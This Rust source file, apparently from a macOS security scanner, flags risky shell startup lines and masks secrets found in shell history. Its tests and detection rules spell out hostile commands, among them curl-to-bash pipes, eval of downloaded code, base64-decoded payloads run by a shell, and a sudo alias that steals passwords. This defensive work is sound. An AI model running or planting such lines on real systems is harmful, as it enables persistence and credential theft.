//! Risky shell startup lines and secrets left in shell history.
//! ClickFix/AMOS chains persist through rc files
//! (https://hackread.com/amos-stealer-macos-keychain-files-browser-passwords/), and
//! stealers grep shell history for keys (LiteLLM 1.107.0 compromise,
//! https://www.wiz.io/blog/litellm-compromised-steals-credentials).
//! History output never contains a line or a value: only counts and masked kinds.

use std::path::{Path, PathBuf};

use crate::models::{Category, Finding, Inspection, ScanContext, Severity};

pub const SHELL_STARTUP_SUB_CATEGORY: &str = "Shell startup files";
pub const SHELL_HISTORY_SUB_CATEGORY: &str = "Secrets in shell history";

const RC_FILES: &[&str] = &[
    ".zshrc",
    ".zshenv",
    ".zprofile",
    ".zlogin",
    ".bashrc",
    ".bash_profile",
    ".profile",
];

const HISTORY_FILES: &[&str] = &[
    ".zsh_history",
    ".bash_history",
    ".python_history",
    ".node_repl_history",
    ".psql_history",
    ".mysql_history",
    ".local/share/fish/fish_history",
];

/// One risky rc line: finding id, severity, what it does.
type RcHit = (&'static str, Severity, &'static str);

fn is_shell(w: &str) -> bool {
    matches!(
        w.rsplit('/').next().unwrap_or(""),
        "sh" | "bash" | "zsh" | "dash"
    )
}

fn word_is_shell(seg: &str) -> bool {
    // Skip `sudo`, `env`, their flags (and the value of the flags that take one, per command)
    // and VAR=value to reach the program that runs. A skipped "value" that is itself a shell
    // is the program.
    let mut words = seg.split_whitespace();
    let mut runner = "";
    while let Some(w) = words.next() {
        let base = w.rsplit('/').next().unwrap_or(w);
        let takes_value = match runner {
            "sudo" => matches!(
                w,
                "-u" | "-g" | "-p" | "-C" | "-U" | "-r" | "-t" | "-D" | "-R" | "-T"
            ),
            "env" => matches!(w, "-u" | "-C" | "-S" | "-P"),
            _ => false,
        };
        if takes_value {
            if words.next().is_some_and(is_shell) {
                return true;
            }
        } else if base == "sudo" || base == "env" {
            runner = base;
        } else if !(w.starts_with('-') || w.contains('=')) {
            return is_shell(w);
        }
    }
    false
}

fn unquote(v: &str) -> &str {
    v.trim().trim_matches(|c| c == '"' || c == '\'')
}

pub fn check_rc_line(line: &str) -> Option<RcHit> {
    let t = line.trim();
    if t.is_empty() || t.starts_with('#') {
        return None;
    }
    let low = t.to_ascii_lowercase();
    let fetch = ["curl ", "curl\t", "wget ", "wget\t"]
        .iter()
        .any(|w| low.contains(w));
    // `$( curl` and `<( curl` are the same as `$(curl`.
    let squeezed = low.replace("$( ", "$(").replace("<( ", "<(");
    let decode = ["base64 -d", "base64 --decode", "base64 -D"]
        .iter()
        .any(|w| t.contains(w));
    let segs: Vec<&str> = t.split('|').collect();
    let piped_to_shell = segs.iter().skip(1).any(|s| word_is_shell(s));

    if fetch && piped_to_shell {
        return Some((
            "shell-rc-pipe-to-shell",
            Severity::High,
            "downloads a script and pipes it to a shell every time a shell starts",
        ));
    }
    if ["$(curl", "$(wget", "`curl", "<(curl", "<(wget"]
        .iter()
        .any(|w| squeezed.contains(w))
        && (low.contains("eval") || low.starts_with("source") || low.starts_with(". "))
    {
        return Some((
            "shell-rc-eval-download",
            Severity::High,
            "runs code fetched from the network every time a shell starts",
        ));
    }
    if decode && (piped_to_shell || low.contains("eval")) {
        return Some((
            "shell-rc-decode-exec",
            Severity::High,
            "decodes base64 and runs the result, a common way to hide a payload",
        ));
    }
    if (t.contains("/tmp/") || t.contains("/private/tmp/"))
        && (low.starts_with("nohup") || t.ends_with('&'))
    {
        return Some((
            "shell-rc-temp-binary",
            Severity::High,
            "starts a program from a temporary folder in the background",
        ));
    }
    // AI agents told to approve everything from every new shell (Gemini CLI YOLO mode can only
    // be turned on from the command line, so an alias or env var is where it lives).
    let compact = low.replace(['"', '\''], "");
    if compact.contains("gemini_cli_trust_workspace=true")
        || (compact.starts_with("alias ")
            && (compact.contains("gemini --yolo")
                || compact.contains("--approval-mode=yolo")
                || compact.contains("--approval-mode yolo")
                || compact.contains("aider --yes-always")))
    {
        return Some((
            "shell-rc-agent-auto-approve",
            Severity::Medium,
            "sets an AI coding agent to approve its own actions in every new shell",
        ));
    }
    if let Some((name, value)) = t.strip_prefix("alias ").and_then(|r| r.split_once('=')) {
        let (name, value) = (name.trim(), unquote(value));
        // Wrappers such as oh-my-zsh's `nocorrect sudo`, `command sudo` and `\sudo` still run sudo.
        let runs = value
            .split_whitespace()
            .find(|w| !matches!(*w, "nocorrect" | "noglob" | "command" | "builtin"))
            .unwrap_or("")
            .trim_start_matches('\\');
        let suspicious =
            value.contains("/tmp/") || value.contains("curl ") || value.contains("base64");
        if name == "sudo" && runs == "doas" && !suspicious {
            return Some((
                "shell-rc-alias-hijack",
                Severity::Medium,
                "replaces sudo with another privilege tool; check you set this up yourself",
            ));
        }
        // Only the system sudo is expected; a program named sudo anywhere else is a fake.
        let hijacks_sudo = name == "sudo" && !matches!(runs, "sudo" | "/usr/bin/sudo");
        if hijacks_sudo || suspicious {
            return Some(("shell-rc-alias-hijack", Severity::High, "replaces a command with an alias that runs something else; a fake sudo alias is how password stealers capture your password"));
        }
        return None;
    }
    if low.contains("osascript -e") {
        return Some((
            "shell-rc-osascript",
            Severity::Medium,
            "runs AppleScript every time a shell starts",
        ));
    }
    let assign = t.strip_prefix("export ").unwrap_or(t);
    if let Some(value) = assign.strip_prefix("PATH=") {
        let first = unquote(value).split(':').next().unwrap_or("");
        if first.is_empty()
            || first == "."
            || first.starts_with("/tmp")
            || first.starts_with("/private/tmp")
        {
            return Some(("shell-rc-path-hijack", Severity::Medium, "puts the current folder or a temporary folder first on PATH, so a planted `ls` or `git` there runs instead of the real one"));
        }
    }
    None
}

/// Token prefixes with a minimum token length, and the masked label shown instead.
const TOKEN_PREFIXES: &[(&str, usize, &str)] = &[
    ("sk-ant-", 30, "sk-ant-..."),
    ("sk-proj-", 30, "sk-proj-..."),
    ("sk-or-v1-", 30, "sk-or-v1-..."),
    ("github_pat_", 40, "github_pat_..."),
    ("ghp_", 40, "ghp_..."),
    ("gho_", 40, "gho_..."),
    ("glpat-", 24, "glpat-..."),
    ("xoxb-", 24, "xoxb-..."),
    ("xoxp-", 24, "xoxp-..."),
    ("npm_", 40, "npm_..."),
    ("hf_", 30, "hf_..."),
    ("gsk_", 30, "gsk_..."),
    ("AIza", 39, "AIza..."),
    ("sk-", 40, "sk-..."),
];

const SECRET_NAME_SUFFIXES: &[(&str, &str)] = &[
    ("_KEY", "*_KEY variable"),
    ("_TOKEN", "*_TOKEN variable"),
    ("_SECRET", "*_SECRET variable"),
    ("_PASSWORD", "*_PASSWORD variable"),
];

fn is_reference_or_placeholder(v: &str) -> bool {
    let low = v.to_ascii_lowercase();
    v.len() < 8
        || v.starts_with(['$', '`', '<'])
        || ["your", "example", "changeme", "placeholder", "xxxx", "<"]
            .iter()
            .any(|p| low.contains(p))
}

/// The command on a history line: strips zsh extended history `: <ts>:<n>;`
/// and fish `- cmd: ` prefixes.
fn command_of(line: &str) -> &str {
    let t = line.trim();
    if let Some(rest) = t.strip_prefix("- cmd: ") {
        return rest.trim();
    }
    // zsh extended history: `: <start>:<elapsed>;<command>`. Bash lines starting with `: ` stay whole.
    if let Some((stamp, cmd)) = t.strip_prefix(": ").and_then(|r| r.split_once(';')) {
        if stamp.split_once(':').is_some_and(|(a, b)| {
            !a.is_empty() && a.chars().chain(b.chars()).all(|c| c.is_ascii_digit())
        }) {
            return cmd.trim();
        }
    }
    t
}

/// The first shell word of an assignment value, keeping quoted spaces.
fn first_value(v: &str) -> &str {
    let v = v.trim();
    for q in ['"', '\''] {
        if let Some(rest) = v.strip_prefix(q) {
            return rest.split(q).next().unwrap_or("");
        }
    }
    v.split_whitespace().next().unwrap_or("")
}

/// Masked kinds of secret found on one history line, e.g. `sk-ant-...`.
pub fn secret_kinds(line: &str) -> Vec<&'static str> {
    let mut kinds = Vec::new();
    let tokens = line.split(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '-'));
    for tok in tokens {
        if tok.len() == 20
            && tok.starts_with("AKIA")
            && tok[4..]
                .chars()
                .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit())
        {
            kinds.push("AKIA...");
            continue;
        }
        if let Some((_, _, label)) = TOKEN_PREFIXES
            .iter()
            .find(|(p, min, _)| tok.starts_with(p) && tok.len() >= *min)
        {
            kinds.push(*label);
        }
    }
    let low = line.to_ascii_lowercase();
    if let Some(i) = low.find("bearer ") {
        let tok = line[i + 7..].split_whitespace().next().unwrap_or("");
        let tok = tok.trim_matches(|c| c == '"' || c == '\'');
        if tok.len() >= 16 && !tok.starts_with('$') {
            kinds.push("Bearer token");
        }
    }
    if let Some(i) = line.find("://") {
        let rest = &line[i + 3..];
        let authority = rest.split(['/', ' ', '"', '\'']).next().unwrap_or("");
        if let Some((userinfo, _)) = authority.rsplit_once('@') {
            if let Some((_, pass)) = userinfo.split_once(':') {
                if !pass.is_empty() && !pass.starts_with('$') {
                    kinds.push("password in URL");
                }
            }
        }
    }
    // Every NAME=value word, so `FOO=1 API_TOKEN=x cmd` and `export A=1 B_TOKEN=x` count.
    let cmd = command_of(line);
    for (i, _) in cmd.match_indices('=') {
        let start = cmd[..i]
            .rfind(|c: char| c.is_whitespace() || c == ';')
            .map_or(0, |j| j + 1);
        let name = &cmd[start..i];
        // `NAME=` followed by a space or nothing is an empty value, not the next word.
        let rest = &cmd[i + 1..];
        if rest.is_empty() || rest.starts_with(char::is_whitespace) {
            continue;
        }
        let value = first_value(rest);
        if !name.is_empty()
            && name
                .chars()
                .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_')
            && !is_reference_or_placeholder(value)
        {
            if let Some((_, label)) = SECRET_NAME_SUFFIXES.iter().find(|(s, _)| name.ends_with(s)) {
                kinds.push(*label);
            }
        }
    }
    kinds.sort_unstable();
    kinds.dedup();
    kinds
}

pub fn scan_shell(ctx: &ScanContext) -> (Vec<Finding>, Vec<Inspection>) {
    let home = std::env::var_os("MACFLOW_HOME")
        .or_else(|| std::env::var_os("HOME"))
        .map(PathBuf::from);
    scan_shell_with_home(ctx, home.as_deref())
}

pub fn scan_shell_with_home(
    ctx: &ScanContext,
    home: Option<&Path>,
) -> (Vec<Finding>, Vec<Inspection>) {
    let subs = [SHELL_STARTUP_SUB_CATEGORY, SHELL_HISTORY_SUB_CATEGORY];
    let skip = |reason| {
        (
            Vec::new(),
            subs.iter()
                .map(|s| Inspection::skipped(Category::Security, Some(s), Some(reason)))
                .collect(),
        )
    };
    if !ctx.is_category_selected(Category::Security) {
        return skip("category not selected");
    }
    let Some(home) = home else {
        return skip("home directory unavailable");
    };
    let mut findings = scan_rc_files(home);
    let (hist_findings, hist_insp) = scan_history(home);
    let rc_count = RC_FILES.iter().filter(|f| home.join(f).is_file()).count();
    let rc_scope = if rc_count == 0 {
        "user (no shell startup files)".to_string()
    } else {
        format!("user ({rc_count} startup files)")
    };
    for f in &mut findings {
        f.scope = Some(rc_scope.clone());
    }
    findings.extend(hist_findings);
    let inspections = vec![
        Inspection::inspected(
            Category::Security,
            Some(SHELL_STARTUP_SUB_CATEGORY),
            rc_scope,
        ),
        hist_insp,
    ];
    (findings, inspections)
}

fn scan_rc_files(home: &Path) -> Vec<Finding> {
    let mut findings = Vec::new();
    for rel in RC_FILES {
        let path = home.join(rel);
        let Ok(text) = std::fs::read_to_string(&path) else {
            continue;
        };
        let shown = path.to_string_lossy();
        for (idx, line) in text.lines().enumerate() {
            if let Some((id, severity, what)) = check_rc_line(line) {
                findings.push(
                    Finding::new(id, format!("~/{rel} {what}"), Category::Security, severity, format!("Line {} of ~/{rel} {what}. Startup files run in every new terminal, so this is a common place for malware to persist.", idx + 1))
                        .with_sub_category(SHELL_STARTUP_SUB_CATEGORY)
                        .with_location(shown.as_ref(), Some(idx + 1))
                        .with_remediation(format!("If you did not add this line, delete it from ~/{rel}, open a new terminal, and rotate tokens that were on this Mac.")),
                );
            }
        }
    }
    findings
}

fn history_files(home: &Path) -> Vec<PathBuf> {
    let mut files: Vec<PathBuf> = HISTORY_FILES
        .iter()
        .map(|r| home.join(r))
        .filter(|p| p.is_file())
        .collect();
    // macOS Terminal keeps per-session zsh history here.
    let mut sessions: Vec<PathBuf> = std::fs::read_dir(home.join(".zsh_sessions"))
        .into_iter()
        .flatten()
        .filter_map(|e| e.ok().map(|e| e.path()))
        .filter(|p| p.extension().is_some_and(|x| x == "history"))
        .collect();
    sessions.sort();
    files.extend(sessions);
    files
}

fn scan_history(home: &Path) -> (Vec<Finding>, Inspection) {
    let files = history_files(home);
    let scope = if files.is_empty() {
        "user (no shell history files)".to_string()
    } else {
        format!("user ({} history files)", files.len())
    };
    let mut findings = Vec::new();
    for path in &files {
        // History can hold invalid UTF-8; decode lossily.
        let Ok(bytes) = std::fs::read(path) else {
            continue;
        };
        let text = String::from_utf8_lossy(&bytes);
        let mut lines = 0;
        let mut kinds: Vec<&str> = Vec::new();
        for line in text.lines() {
            let found = secret_kinds(line);
            if !found.is_empty() {
                lines += 1;
                kinds.extend(found);
            }
        }
        if lines == 0 {
            continue;
        }
        kinds.sort_unstable();
        kinds.dedup();
        let shown = path.to_string_lossy();
        let name = path
            .file_name()
            .map(|n| n.to_string_lossy().into_owned())
            .unwrap_or_default();
        let plural = if lines == 1 { "line" } else { "lines" };
        findings.push(
            Finding::new(
                "shell-history-secrets",
                format!("{name} has secrets on {lines} {plural}"),
                Category::Security,
                Severity::Medium,
                format!("Found: {}. Values are not shown. Infostealers read shell history for exactly these.", kinds.join(", ")),
            )
            .with_sub_category(SHELL_HISTORY_SUB_CATEGORY)
            .with_scope(scope.clone())
            .with_location(shown.as_ref(), None)
            .with_remediation(format!("Rotate those keys, then delete the lines from {shown} in an editor with other terminals closed. In zsh, `setopt HIST_IGNORE_SPACE` keeps commands typed with a leading space out of history.")),
        );
    }
    let insp = Inspection::inspected(Category::Security, Some(SHELL_HISTORY_SUB_CATEGORY), scope);
    (findings, insp)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::InspectionStatus;
    use std::fs;
    use std::sync::atomic::{AtomicU64, Ordering};

    fn tmp() -> PathBuf {
        static N: AtomicU64 = AtomicU64::new(0);
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let n = N.fetch_add(1, Ordering::Relaxed);
        let p = std::env::temp_dir().join(format!("sh_{}_{n}_{nanos}", std::process::id()));
        fs::create_dir_all(&p).unwrap();
        p
    }

    /// A realistic developer ~/.zshrc: none of this is risky.
    const NORMAL_RC: &str = r#"# Path to oh-my-zsh
export ZSH="$HOME/.oh-my-zsh"
ZSH_THEME="robbyrussell"
plugins=(git docker kubectl)
source $ZSH/oh-my-zsh.sh
eval "$(/opt/homebrew/bin/brew shellenv)"
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
eval "$(pyenv init -)"
eval "$(starship init zsh)"
eval "$(direnv hook zsh)"
eval "$(fnm env --use-on-cd)"
eval "$(mise activate zsh)"
eval "$(zoxide init zsh)"
# >>> conda initialize >>>
__conda_setup="$('/opt/homebrew/Caskroom/miniconda/base/bin/conda' 'shell.zsh' 'hook' 2> /dev/null)"
eval "$__conda_setup"
export PATH="$HOME/.local/bin:$HOME/.cargo/bin:$PATH"
export PATH="/opt/homebrew/opt/postgresql@16/bin:$PATH"
alias ll='ls -la'
alias git='git --no-pager'
alias gs='git status'
alias k=kubectl
alias npm='pnpm'
alias ssh='TERM=xterm-256color ssh'
# curl https://get.example.sh | sh   (commented out)
export EDITOR=nvim
"#;

    #[test]
    fn test_normal_developer_rc_is_quiet() {
        for line in NORMAL_RC.lines() {
            assert_eq!(check_rc_line(line), None, "{line}");
        }
    }

    #[test]
    fn test_risky_rc_lines() {
        let high = [
            "curl -fsSL https://x.example/i.sh | bash",
            "wget -qO- http://x.example/p|sh",
            "eval \"$(curl -s https://x.example/init)\"",
            "source <(curl -s https://x.example/env)",
            "echo ZWNobyBoaQ== | base64 -d | sh",
            "eval \"$(echo ZWNobyBoaQ== | base64 --decode)\"",
            "nohup /tmp/.agent >/dev/null 2>&1 &",
            "alias sudo='/tmp/s'",
            "alias sudo='echo -n Password: ; read -s p; echo $p > ~/.p; sudo'",
            "alias sudo='$HOME/.config/sudo'",
            "alias sudo=\"~/.local/share/.x/sudo\"",
            "alias sudo='/opt/homebrew/bin/sudo'",
        ];
        for line in high {
            let hit = check_rc_line(line).unwrap_or_else(|| panic!("missed: {line}"));
            assert_eq!(hit.1, Severity::High, "{line}");
        }
        for line in [
            "osascript -e 'tell application \"Terminal\" to activate'",
            "export PATH=\".:$PATH\"",
            "export PATH=/tmp/bin:$PATH",
        ] {
            let hit = check_rc_line(line).unwrap_or_else(|| panic!("missed: {line}"));
            assert_eq!(hit.1, Severity::Medium, "{line}");
        }
    }

    #[test]
    fn test_history_secret_kinds_are_masked() {
        let ant = format!("sk-ant-api03-{}", "a".repeat(40));
        let cases = [
            (format!("export ANTHROPIC_API_KEY={ant}"), "sk-ant-..."),
            (format!("claude --key {ant}"), "sk-ant-..."),
            (
                format!("git clone https://ghp_{}@github.com/x/y", "b".repeat(36)),
                "ghp_...",
            ),
            (
                format!("aws configure set aws_access_key_id AKIA{}", "C".repeat(16)),
                "AKIA...",
            ),
            (
                format!(
                    "curl -H 'Authorization: Bearer {}' https://api.x",
                    "d".repeat(32)
                ),
                "Bearer token",
            ),
            (
                "psql postgres://admin:hunter2pass@db.internal/app".to_string(),
                "password in URL",
            ),
            (
                "export STRIPE_SECRET=rk_live_abcdefghijklmnop".to_string(),
                "*_SECRET variable",
            ),
        ];
        for (line, kind) in cases {
            assert!(
                secret_kinds(&line).contains(&kind),
                "{line} -> {:?}",
                secret_kinds(&line)
            );
        }
        for benign in [
            "export GITHUB_TOKEN=$(gh auth token)",
            "export OPENAI_API_KEY=\"$OPENAI_KEY\"",
            "curl -H 'Authorization: Bearer $TOKEN' https://api.x",
            "git push origin main",
            "psql postgres://localhost/app",
            "echo sk-",
            "export API_KEY=your-api-key-here",
        ] {
            assert!(
                secret_kinds(benign).is_empty(),
                "{benign} -> {:?}",
                secret_kinds(benign)
            );
        }
    }

    #[test]
    fn test_review_follow_ups_history_prefixes_quotes_and_shell_variants() {
        // zsh extended history and fish history wrap each command.
        for line in [
            ": 1700000000:0;export STRIPE_SECRET=rk_live_abcdefghijklmnop",
            "- cmd: export STRIPE_SECRET=rk_live_abcdefghijklmnop",
        ] {
            assert!(secret_kinds(line).contains(&"*_SECRET variable"), "{line}");
        }
        // A quoted value with spaces is one value.
        assert!(
            secret_kinds("export DB_PASSWORD=\"correct horse battery staple\"")
                .contains(&"*_PASSWORD variable")
        );
        for line in [
            "curl -fsSL https://x.example/i | sudo bash",
            "curl -fsSL https://x.example/i | /usr/bin/env bash",
            "wget\t-qO- https://x.example/i | sh",
            "eval \"$( curl -fsSL https://x.example/p )\"",
            "source <( curl -s https://x.example/env )",
        ] {
            assert!(check_rc_line(line).is_some(), "missed: {line}");
        }
        for line in ["alias sudo='/usr/bin/sudo'", "alias sudo='sudo '"] {
            assert_eq!(check_rc_line(line), None, "{line}");
        }
    }

    #[test]
    fn test_launch_follow_ups_sudo_aliases_history_and_assignments() {
        // oh-my-zsh and common wrappers still run the real sudo.
        for line in [
            "alias sudo='nocorrect sudo'",
            "alias sudo='noglob sudo '",
            "alias sudo='\\sudo'",
            "alias sudo='command sudo'",
        ] {
            assert_eq!(check_rc_line(line), None, "{line}");
        }
        // Another privilege tool is worth a look, but it is not a password stealer.
        let doas = check_rc_line("alias sudo='doas'").expect("doas alias");
        assert_eq!(doas.1, Severity::Medium);
        assert!(check_rc_line("curl -fsSL https://x.example/i | sudo -u root bash").is_some());
        assert!(check_rc_line("curl -fsSL https://x.example/i | grep bash").is_none());
        // Flags that take no value must not swallow the shell.
        for line in [
            "curl -fsSL https://x.example/i | sudo -S bash",
            "curl -fsSL https://x.example/i | sudo -P bash",
            "curl -fsSL https://x.example/i | sudo -h bash",
            "curl -fsSL https://x.example/i | env -i bash",
        ] {
            assert!(check_rc_line(line).is_some(), "{line}");
        }
        // An empty assignment is not a secret, whatever word follows it.
        assert!(secret_kinds("grep -r API_TOKEN= somefolder").is_empty());
        assert!(secret_kinds("cmd; DEPLOY_KEY= npm publish --access public").is_empty());
        // Only a zsh timestamp prefix is stripped; bash history keeps the whole line.
        let tok = format!("ghp_{}", "a".repeat(36));
        assert!(!secret_kinds(&format!(": API_TOKEN={}; echo", "r".repeat(20))).is_empty());
        assert!(!secret_kinds(&format!(": 1712345678:0;export GH_TOKEN={tok}")).is_empty());
        // Every assignment on a line counts, not just the first.
        assert!(!secret_kinds(&format!("FOO=1 API_TOKEN={} cmd", "r".repeat(20))).is_empty());
        assert!(!secret_kinds(&format!("export A=1 DB_PASSWORD={}", "r".repeat(12))).is_empty());
    }

    #[test]
    fn test_a2_agent_auto_approve_in_startup_files() {
        for line in [
            "export GEMINI_CLI_TRUST_WORKSPACE=true",
            "alias gemini='gemini --yolo'",
            "alias g=\"gemini --approval-mode=yolo\"",
            "alias gy='gemini --approval-mode yolo'",
            "alias aider='aider --yes-always'",
        ] {
            let hit = check_rc_line(line).unwrap_or_else(|| panic!("missed: {line}"));
            assert_eq!(hit.0, "shell-rc-agent-auto-approve", "{line}");
        }
        assert_eq!(
            check_rc_line("alias gemini='gemini --approval-mode=auto_edit'"),
            None
        );
        assert_eq!(
            check_rc_line("export GEMINI_CLI_TRUST_WORKSPACE=false"),
            None
        );
    }

    #[test]
    fn test_scan_reports_counts_never_values() {
        let home = tmp();
        let ant = format!("sk-ant-api03-{}", "a".repeat(40));
        let akia = format!("AKIA{}", "Z".repeat(16));
        fs::write(
            home.join(".zshrc"),
            format!("{NORMAL_RC}curl -s https://x.example/a | sh\n"),
        )
        .unwrap();
        fs::write(
            home.join(".zsh_history"),
            format!(": 1700000000:0;export ANTHROPIC_API_KEY={ant}\n: 1700000001:0;ls\n: 1700000002:0;aws s3 ls --key {akia}\n: 1700000003:0;echo {ant}\n"),
        )
        .unwrap();
        fs::write(home.join(".python_history"), "import os\nprint(1)\n").unwrap();

        let (f, i) = scan_shell_with_home(&ScanContext::new(), Some(&home));
        let rc: Vec<&Finding> = f
            .iter()
            .filter(|x| x.sub_category.as_deref() == Some(SHELL_STARTUP_SUB_CATEGORY))
            .collect();
        assert_eq!(rc.len(), 1, "{f:?}");
        assert_eq!(rc[0].severity, Severity::High);
        assert!(rc[0].line_number.is_some());

        let hist: Vec<&Finding> = f
            .iter()
            .filter(|x| x.sub_category.as_deref() == Some(SHELL_HISTORY_SUB_CATEGORY))
            .collect();
        assert_eq!(hist.len(), 1, "{f:?}");
        assert_eq!(hist[0].severity, Severity::Medium);
        assert!(hist[0].title.contains("3 lines"), "{}", hist[0].title);
        assert!(
            hist[0].description.contains("sk-ant-...") && hist[0].description.contains("AKIA...")
        );
        assert_eq!(hist[0].line_number, None);

        let all = serde_json::to_string(&f).unwrap();
        assert!(
            !all.contains(&ant[8..20]) && !all.contains(&akia[4..]),
            "secret leaked: {all}"
        );
        assert!(!all.contains("ANTHROPIC_API_KEY="), "line leaked");
        for x in &f {
            assert!(i.iter().any(|insp| matches!(&insp.status,
                InspectionStatus::Inspected { inspected_scope } if Some(inspected_scope) == x.scope.as_ref())));
        }
    }

    #[test]
    fn test_nothing_present_and_not_selected() {
        let home = tmp();
        let (f, i) = scan_shell_with_home(&ScanContext::new(), Some(&home));
        assert!(f.is_empty());
        assert_eq!(i.len(), 2);
        let ctx = ScanContext::new().with_categories(vec![Category::Garbage]);
        let (_, i) = scan_shell_with_home(&ctx, Some(&home));
        assert!(i
            .iter()
            .all(|x| matches!(x.status, InspectionStatus::Skipped { .. })));
    }
}
